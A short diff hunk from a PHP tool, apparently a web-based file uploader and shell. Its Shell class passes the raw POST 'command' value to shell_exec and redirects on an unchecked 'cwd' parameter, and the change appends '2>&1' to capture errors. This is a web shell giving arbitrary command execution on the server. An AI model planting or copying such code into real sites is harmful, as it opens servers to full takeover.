@@ -38,7 +38,7 @@ class Uploader {
 class Shell {
 	function __construct() {
 		// 実行ボタンのクリックでコマンドを実行する
-		file_put_contents(__DIR__.'/output.txt', shell_exec($_POST['command']));
+		file_put_contents(__DIR__.'/output.txt', shell_exec($_POST['command'].' 2>&1'));
 		header('Location: ./?cwd='.$_GET['cwd']);
 		exit();
 	}
